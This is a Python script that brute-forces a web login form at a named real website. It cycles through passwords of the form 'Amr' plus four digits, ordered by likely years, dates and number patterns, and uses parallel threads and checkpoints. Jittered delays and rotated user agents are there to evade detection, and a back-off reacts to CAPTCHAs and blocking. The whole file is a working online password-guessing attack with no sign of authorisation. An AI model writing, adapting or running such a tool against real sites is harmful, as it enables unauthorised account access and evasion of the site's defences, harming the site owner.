import requests
from bs4 import BeautifulSoup
import time
import random
import concurrent.futures
import threading
import logging
import os
import json
from datetime import datetime
import multiprocessing
import signal
import sys
import math
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

# Define a global variable to store the json log file path
json_log_file = None

def generate_password(number):
    """Generate password in format Amr + 4-digit number"""
    # Ensure number is 4 digits
    if number < 1000 or number > 9999:
        raise ValueError(f"Number {number} is not a 4-digit number (1000-9999)")
    return f"Amr{number}"

def setup_session_with_retries():
    """Create a session with retry logic"""
    session = requests.Session()
    
    # Configure retry strategy
    retries = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["POST", "GET"]
    )
    
    # Add random user agent
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    
    session.headers.update({"User-Agent": random.choice(user_agents)})
    
    # Mount it for both http and https usage
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def test_password(password, url, session_factory):
    """Test if password works on the login page"""
    # Create a new session for this thread
    session = session_factory()
    
    try:
        # Prepare the form data based on the HTML source
        form_data = {
            "ps": password,  # Password field name is "ps"
            "su": "Continue"  # Submit button value
        }
        
        # Send POST request with the password
        start_time = time.time()
        response = session.post(url, data=form_data)
        response_time = time.time() - start_time
        
        # Check for IP blocking, CAPTCHA, or rate limiting
        if response.status_code == 403 or response.status_code == 429:
            log_message(f"WARNING: Possible IP blocking or rate limiting detected (status {response.status_code})", "warning")
            # Add longer delay to recover
            time.sleep(5)
            return False, password
            
        if "captcha" in response.text.lower() or "blocked" in response.text.lower():
            log_message(f"WARNING: CAPTCHA or IP blocking detected in response", "warning")
            # Add longer delay to recover
            time.sleep(10)
            return False, password
        
        # Collect response info for logging
        response_info = {
            "status_code": response.status_code,
            "url": response.url,
            "response_time": response_time,
            "content_length": len(response.text),
            "headers": dict(response.headers)
        }
        
        # Specific success/failure detection based on site behavior
        result = False
        
        # Success indicator: Redirection to SC.php
        if "SC.php" in response.url or response.url.endswith("SC.php"):
            result = True
            log_message(f"Success detected! Redirected to {response.url}", "critical")
        
        # Failure indicator: Error password text - with more flexible matching
        elif "<span" in response.text and "color:red" in response.text and "Error password" in response.text:
            result = False
            log_message(f"Explicit failure detected for {password}", "debug")
        # Backup check for any error message containing "Error" and "password"
        elif "Error" in response.text and "password" in response.text:
            result = False
            log_message(f"Generic error message detected for {password}", "debug")
        
        # Log this attempt
        log_attempt(password, result, response_info)
        
        return result, password
        
    except Exception as e:
        error_msg = str(e)
        log_message(f"Error testing password {password}: {error_msg}", "error")
        
        # Log the failed attempt
        log_attempt(password, False, {"error": error_msg})
        
        return False, password

def create_session():
    """Create and return a new session with retry logic"""
    try:
        return setup_session_with_retries()
    except Exception as e:
        log_message(f"Error creating session: {e}", "error")
        # Wait a bit and try again
        time.sleep(2)
        try:
            return setup_session_with_retries()
        except Exception as e:
            log_message(f"Second attempt to create session failed: {e}", "error")
            # Fall back to a basic session
            session = requests.Session()
            session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            return session

def save_checkpoint(last_number, success_stats=None):
    """Save the current progress to a checkpoint file"""
    checkpoint_data = {
        "last_number": last_number,
        "timestamp": datetime.now().isoformat(),
        "stats": success_stats or {}
    }
    
    with open("password_checkpoint.json", "w") as f:
        json.dump(checkpoint_data, f)
        
    log_message(f"Checkpoint saved at number {last_number}")

def load_checkpoint():
    """Load the last checkpoint if it exists"""
    try:
        with open("password_checkpoint.json", "r") as f:
            checkpoint_data = json.load(f)
            log_message(f"Loaded checkpoint from: {checkpoint_data['timestamp']}")
            if "stats" in checkpoint_data:
                log_message(f"Previous run statistics: {checkpoint_data['stats']}")
            return checkpoint_data["last_number"]
    except FileNotFoundError:
        return 1000  # Default starting point
    except Exception as e:
        log_message(f"Error loading checkpoint: {e}", "error")
        return 1000

def get_prioritized_numbers():
    """Return a list of numbers prioritized by likelihood of being a password"""
    log_message("Generating prioritized number list...")
    all_numbers = []
    
    # Priority 1: Years (recent years, common era years, etc.)
    years = []
    # Recent years (people often use birth years, graduation years, etc.)
    years.extend(range(1970, 2024))
    # Add years that might be significant (2000, 2020, etc.)
    special_years = [2000, 2010, 2020, 1900, 1950]
    years.extend(special_years)
    # Ensure all are 4 digits
    years = [year for year in years if 1000 <= year <= 9999]
    
    # Priority 2: Common number patterns (ensure all are 4 digits)
    patterns = [
        # Repeated digits
        1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999,
        # Sequential ascending
        1234, 2345, 3456, 4567, 5678, 6789,
        # Sequential descending
        9876, 8765, 7654, 6543, 5432, 4321,
        # Alternating patterns
        1212, 1313, 1414, 1515, 2323, 2424, 2525, 3434, 3535, 4545, 5656,
        # Common combinations
        1122, 1133, 1144, 2233, 2244, 3344, 1221, 1331, 1441, 2332, 2442, 3443,
        # Keyboard patterns (numeric keypad) - corrected without leading zeros
        1357, 2468, 1397, 1793, 2580, 1852, 1470, 1741, 1590, 1951
    ]
    
    # Priority 3: Dates (MMDD and DDMM formats - common birthdays, anniversaries)
    dates = []
    for month in range(1, 13):
        for day in range(1, 32):
            if (month == 2 and day > 29) or ((month in [4, 6, 9, 11]) and day > 30):
                continue
            # MMDD format
            mmdd = month * 100 + day
            # DDMM format
            ddmm = day * 100 + month
            
            # Ensure they're 4-digit numbers
            if 1000 <= mmdd <= 9999:
                dates.append(mmdd)
            if 1000 <= ddmm <= 9999:
                dates.append(ddmm)
    
    # Priority 4: Special dates (holidays, etc.)
    special_dates = [
        1225,  # Christmas
        1031,  # Halloween
        1101,  # New Year (0101)
        1704,  # Independence Day (US) (0704)
        1314,  # Pi Day (0314)
        1111,  # Singles' Day / Veterans Day
        1212   # Universal hour
    ]
    # Add special dates that are 4 digits
    dates.extend([date for date in special_dates if 1000 <= date <= 9999])
    
    # Combine priority lists with logging
    log_message(f"Added {len(years)} years")
    all_numbers.extend(years)
    
    log_message(f"Added {len(patterns)} common patterns")
    all_numbers.extend(patterns)
    
    log_message(f"Added {len(dates)} dates")
    all_numbers.extend(dates)
    
    # Apply divide and conquer for remaining numbers
    
    # Start with important ranges that people might choose
    # Middle range (often chosen psychologically)
    middle_range = list(range(5000, 5999))
    # "Round" numbers that feel significant
    round_numbers = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 
                     1500, 2500, 3500, 4500, 5500, 6500, 7500, 8500, 9500]
    
    log_message(f"Added {len(middle_range)} middle-range numbers")
    all_numbers.extend(middle_range)
    
    log_message(f"Added {len(round_numbers)} 'round' numbers")
    all_numbers.extend(round_numbers)
    
    # Now apply divide and conquer for remaining numbers (descending order)
    # First test higher range (5000-9999) in descending order
    high_range = list(range(9999, 4999, -1))
    log_message(f"Adding high range (9999-5000) in descending order")
    
    # Then test lower range (1000-4999) in descending order
    low_range = list(range(4999, 999, -1))
    log_message(f"Adding low range (4999-1000) in descending order")
    
    # Add remaining numbers that aren't already included
    remaining = []
    for n in high_range + low_range:
        if n not in all_numbers:
            remaining.append(n)
    
    log_message(f"Added {len(remaining)} remaining numbers in divide-and-conquer order")
    all_numbers.extend(remaining)
    
    # Final check to ensure all numbers are 4 digits and no duplicates
    unique_numbers = []
    seen = set()
    for n in all_numbers:
        if 1000 <= n <= 9999 and n not in seen:
            unique_numbers.append(n)
            seen.add(n)
    
    log_message(f"Final prioritized list contains {len(unique_numbers)} unique 4-digit numbers")
    return unique_numbers

def setup_logging():
    """Set up logging to file and console"""
    global json_log_file  # Declare we'll use the global variable
    
    # Create logs directory if it doesn't exist
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    # Create a unique log filename with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"logs/password_test_{timestamp}.log"
    
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()  # Also output to console
        ]
    )
    
    # Create JSON log file for detailed attempts
    json_log_file = f"logs/detailed_attempts_{timestamp}.json"
    with open(json_log_file, "w") as f:
        f.write("")  # Create empty file
    
    logging.info(f"Logging initialized. Log file: {log_file}")
    logging.info(f"Detailed JSON logs: {json_log_file}")
    
    return log_file, json_log_file

def log_message(message, level="info"):
    """Log a message with the specified level"""
    if level.lower() == "debug":
        logging.debug(message)
    elif level.lower() == "warning":
        logging.warning(message)
    elif level.lower() == "error":
        logging.error(message)
    elif level.lower() == "critical":
        logging.critical(message)
    else:
        logging.info(message)

def log_attempt(password, result, response_info=None):
    """Log details about a password attempt"""
    global json_log_file  # Access the global variable
    
    status = "SUCCESS" if result else "FAILED"
    log_data = {
        "timestamp": datetime.now().isoformat(),
        "password": password,
        "status": status,
        "response_info": response_info
    }
    
    # Log to the main log file
    log_message(f"Password attempt: {password} - {status}")
    
    # Clean up memory-intensive parts of response_info before logging
    if response_info and "headers" in response_info:
        # Keep only essential headers
        essential_headers = ["Content-Type", "Content-Length", "Location", "Server"]
        response_info["headers"] = {k: v for k, v in response_info["headers"].items() 
                                   if k in essential_headers}
    
    # Also save detailed JSON logs for later analysis
    try:
        # First check if json_log_file is defined
        if json_log_file:
            with open(json_log_file, "a") as f:
                f.write(json.dumps(log_data) + "\n")
        else:
            # Fallback if json_log_file is not defined
            fallback_path = "logs/detailed_attempts_fallback.json"
            with open(fallback_path, "a") as f:
                f.write(json.dumps(log_data) + "\n")
            log_message(f"Using fallback log file: {fallback_path}", "warning")
    except Exception as e:
        log_message(f"Error writing to JSON log: {e}", "error")

def get_optimal_worker_count(network_intensive=True):
    """Determine the optimal number of worker threads based on system resources and type of work"""
    # Get CPU count
    cpu_count = multiprocessing.cpu_count()
    
    # For network-bound operations like password testing
    if network_intensive:
        # Multiply by a factor since tasks are I/O bound
        suggested = min(32, cpu_count * 4)  
        
        # Apply limiting factors
        # 1. For very slow connections, limit workers
        # 2. For rate-limited services, use fewer workers
        
        # Start with a conservative number but higher than before
        if cpu_count <= 2:
            return 4
        elif cpu_count <= 4:
            return 8
        elif cpu_count <= 8:
            return 16
        else:
            return min(24, suggested)  # Cap at 24 workers
    else:
        # For CPU-bound operations
        return max(1, cpu_count - 1)  # Leave one CPU for system processes

def calculate_eta(attempts, total, elapsed):
    """Calculate estimated time to completion"""
    if attempts <= 0:
        return "Unknown"
    
    rate = attempts / elapsed if elapsed > 0 else 0
    if rate <= 0:
        return "Unknown"
        
    remaining = total - attempts
    eta_seconds = remaining / rate
    
    # Format the ETA nicely
    if eta_seconds < 60:
        return f"{eta_seconds:.0f} seconds"
    elif eta_seconds < 3600:
        return f"{eta_seconds/60:.1f} minutes"
    else:
        return f"{eta_seconds/3600:.1f} hours"

def signal_handler(sig, frame):
    """Handle interrupt signals gracefully"""
    log_message("Interrupt received, saving checkpoint and exiting...", "warning")
    # The actual checkpoint saving will be done in the main function
    print("\nInterrupt received. Exiting gracefully...")
    sys.exit(0)

def process_batch(batch, login_url, counter_lock, attempts, start_time, success_found, successful_password, 
                  json_log_file, batch_id=0, total_passwords=9000):
    """Process a batch of password numbers"""
    # Track response times to adapt delay
    recent_response_times = []
    current_delay = 0.05  # Start with minimal delay
    
    # Setup batch-specific statistics
    batch_start_time = time.time()
    batch_attempts = 0
    successful = False
    
    for number in batch:
        if success_found.is_set():
            # Another batch found the password
            log_message(f"Batch {batch_id}: Stopping as success was found by another worker")
            return
            
        password = generate_password(number)
        batch_attempts += 1
        
        with counter_lock:
            attempts[0] += 1
            current_attempt = attempts[0]
        
        # Display progress with correct total
        if current_attempt % 50 == 0:
            elapsed = time.time() - start_time
            rate = current_attempt / elapsed if elapsed > 0 else 0
            percent_complete = (current_attempt / total_passwords) * 100
            eta = calculate_eta(current_attempt, total_passwords, elapsed)
            
            progress_msg = f"Progress: {current_attempt}/{total_passwords} ({percent_complete:.1f}%)"
            log_message(progress_msg)
            log_message(f"Elapsed time: {elapsed:.2f} seconds")
            log_message(f"Rate: {rate:.2f} passwords/second")
            log_message(f"Current password: {password}")
            log_message(f"Current delay: {current_delay:.3f} seconds")
            log_message(f"ETA: {eta}")
        elif current_attempt % 10 == 0:
            # Simple progress indicator
            print(".", end="", flush=True)
        
        # Test current password
        test_start = time.time()
        result, pwd = test_password(password, login_url, create_session)
        response_time = time.time() - test_start
        
        # Update recent response times list (keep last 10)
        recent_response_times.append(response_time)
        if len(recent_response_times) > 10:
            recent_response_times.pop(0)
        
        # Dynamic delay adjustment
        if len(recent_response_times) >= 5:
            avg_response = sum(recent_response_times) / len(recent_response_times)
            # If responses are getting slower, increase delay to avoid rate limiting
            if avg_response > 0.5:  # Server is slow/stressed
                current_delay = min(0.3, current_delay * 1.2)  # Increase delay but cap it
            elif avg_response > 0.2:  # Server is moderately loaded
                # Keep delay roughly the same with small random variations
                current_delay = current_delay * random.uniform(0.95, 1.05)
            else:  # Server is responding quickly
                current_delay = max(0.05, current_delay * 0.9)  # Decrease delay but maintain minimum
            
            # Add randomness to avoid detection of fixed patterns
            current_delay *= random.uniform(0.9, 1.1)
        
        # If login successful, exit loop
        if result:
            batch_end_time = time.time()
            elapsed = time.time() - start_time
            batch_elapsed = batch_end_time - batch_start_time
            
            success_msg = f"SUCCESS! Password found: {pwd}"
            log_message(success_msg, "critical")
            log_message(f"Found after {current_attempt} attempts in {elapsed:.2f} seconds", "critical")
            log_message(f"Batch {batch_id}: Found password after {batch_attempts} attempts in {batch_elapsed:.2f} seconds", "critical")
            
            # Save detailed success information
            success_info = {
                "password": pwd,
                "attempts": current_attempt,
                "batch_id": batch_id,
                "batch_attempts": batch_attempts,
                "total_time": elapsed,
                "batch_time": batch_elapsed,
                "timestamp": datetime.now().isoformat(),
                "success_rate": current_attempt / elapsed if elapsed > 0 else 0
            }
            
            try:
                with open("success_details.json", "w") as f:
                    json.dump(success_info, f, indent=2)
            except Exception as e:
                log_message(f"Error saving success details: {e}", "error")
            
            # Save password to file
            with open("found_password.txt", "w") as f:
                f.write(pwd)
            
            successful_password[0] = pwd
            successful = True
            success_found.set()
            return
        
        # Apply adaptive delay with jitter to avoid detection
        jitter = random.uniform(0.8, 1.2)
        time.sleep(current_delay * jitter)
    
    # Batch complete without finding password
    batch_end_time = time.time()
    batch_elapsed = batch_end_time - batch_start_time
    batch_rate = batch_attempts / batch_elapsed if batch_elapsed > 0 else 0
    
    log_message(f"Batch {batch_id}: Completed {batch_attempts} passwords in {batch_elapsed:.2f} seconds ({batch_rate:.2f} pwd/sec)")
    return successful

def process_batch_with_semaphore(batch, login_url, counter_lock, attempts, start_time, 
                                success_found, successful_password, json_log_file, 
                                batch_id, total_passwords, semaphore):
    """Wrapper for process_batch that uses a semaphore for rate limiting"""
    result = False
    try:
        result = process_batch(batch, login_url, counter_lock, attempts, start_time, 
                              success_found, successful_password, json_log_file, 
                              batch_id, total_passwords)
    except Exception as e:
        log_message(f"Error in batch {batch_id}: {e}", "error")
    return result

def main():
    """Main function to control password testing process"""
    # Set up signal handler for graceful termination
    signal.signal(signal.SIGINT, signal_handler)
    
    # URL of the login page
    login_url = "https://amr-elsherif.net/"
    
    # Setup logging
    log_file, json_log_file = setup_logging()
    log_message("Password Testing Script Started")
    log_message(f"Target URL: {login_url}")
    
    # Get prioritized numbers
    all_numbers = get_prioritized_numbers()
    
    # Validate all numbers are 4 digits
    invalid_numbers = [n for n in all_numbers if n < 1000 or n > 9999]
    if invalid_numbers:
        log_message(f"WARNING: Found {len(invalid_numbers)} invalid numbers in the test set", "warning")
        log_message(f"First few invalid numbers: {invalid_numbers[:5]}", "warning")
        log_message("Filtering out invalid numbers...")
        all_numbers = [n for n in all_numbers if n >= 1000 and n <= 9999]
    
    log_message(f"Testing {len(all_numbers)} passwords in prioritized order")
    log_message("Using enhanced divide and conquer approach with smart prioritization")
    
    # Load checkpoint if exists
    start_number_idx = 0
    try:
        checkpoint = load_checkpoint()
        if checkpoint > 1000:
            # Find the index of this number in our prioritized list
            try:
                start_number_idx = all_numbers.index(checkpoint)
                log_message(f"Resuming from checkpoint: Amr{checkpoint} (index {start_number_idx})")
            except ValueError:
                log_message(f"Checkpoint number {checkpoint} not found in prioritized list, starting from beginning")
    except Exception as e:
        log_message(f"Error loading checkpoint: {e}", "warning")
    
    # Slice the numbers list to start from checkpoint
    all_numbers = all_numbers[start_number_idx:]
    total_passwords = len(all_numbers)
    
    log_message(f"Will test {total_passwords} passwords from current position")
    
    # Track attempts
    attempts = [0]  # Using a list for mutable reference
    start_time = time.time()
    
    # Thread-safe counter
    counter_lock = threading.Lock()
    success_found = threading.Event()
    successful_password = [None]  # Using a list to store the result
    
    print("=" * 50)
    print("Password Testing Script Started")
    print(f"Log file: {log_file}")
    print("Target URL: https://amr-elsherif.net/")
    print("Testing passwords in format: Amr[1000-9999] with enhanced smart prioritization")
    print("=" * 50)
    
    # Dynamically determine batch size based on total passwords
    batch_size = min(100, max(10, total_passwords // 1000))
    log_message(f"Using batch size of {batch_size} passwords")
    
    # Create batches of numbers to test
    batches = [all_numbers[i:i+batch_size] for i in range(0, len(all_numbers), batch_size)]
    
    # Use ThreadPoolExecutor to test passwords in parallel
    max_workers = get_optimal_worker_count(network_intensive=True)
    log_message(f"Starting parallel testing with {max_workers} workers")
    
    # Create a semaphore to limit concurrent requests
    request_semaphore = threading.Semaphore(max_workers)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        
        # Submit batch processing tasks with batch IDs and semaphore
        for i, batch in enumerate(batches):
            future = executor.submit(
                process_batch_with_semaphore, 
                batch, 
                login_url, 
                counter_lock, 
                attempts, 
                start_time, 
                success_found, 
                successful_password,
                json_log_file,
                i,
                total_passwords,
                request_semaphore
            )
            futures.append(future)
        
        # Wait for either all futures to complete or a success to be found
        completed = 0
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            completed += 1
            
            if i % 5 == 0 or completed % 50 == 0:
                # Save checkpoint periodically
                current_batch_idx = i * batch_size
                if current_batch_idx < len(all_numbers):
                    current_num = all_numbers[current_batch_idx]
                    
                    # Add stats to checkpoint
                    elapsed = time.time() - start_time
                    current_stats = {
                        "attempts": attempts[0],
                        "elapsed": f"{elapsed:.2f} seconds",
                        "rate": f"{attempts[0]/elapsed:.2f} passwords/second" if elapsed > 0 else "0",
                        "completed_batches": completed,
                        "total_batches": len(batches),
                        "percent_complete": f"{(completed/len(batches))*100:.1f}%"
                    }
                    
                    save_checkpoint(current_num, current_stats)
                    
            if success_found.is_set():
                # Cancel all remaining futures
                log_message("Success found! Cancelling remaining tasks...")
                for f in futures:
                    if not f.done():
                        f.cancel()
                break
    
    elapsed = time.time() - start_time
    if not success_found.is_set():
        log_message("All passwords tested. No successful login found.", "warning")
    
    log_message(f"Script completed in {elapsed:.2f} seconds")
    log_message(f"Tested {attempts[0]} passwords")
    
    # Generate summary statistics
    log_message("=== Testing Summary ===")
    log_message(f"Total passwords tested: {attempts[0]}")
    log_message(f"Total time: {elapsed:.2f} seconds")
    log_message(f"Average rate: {attempts[0]/elapsed:.2f} passwords/second")
    if successful_password[0]:
        log_message(f"Successful password: {successful_password[0]}")
        
    # Write a final summary file
    summary = {
        "script_version": "Enhanced Password Tester 1.0",
        "start_time": start_time,
        "end_time": time.time(),
        "elapsed_seconds": elapsed,
        "total_passwords_tested": attempts[0],
        "passwords_per_second": attempts[0]/elapsed if elapsed > 0 else 0,
        "success": bool(successful_password[0]),
        "found_password": successful_password[0] if successful_password[0] else None,
        "max_workers": max_workers,
        "batch_size": batch_size
    }
    
    try:
        with open(f"logs/summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", "w") as f:
            json.dump(summary, f, indent=2)
    except Exception as e:
        log_message(f"Error writing summary: {e}", "error")

if __name__ == "__main__":
    main()
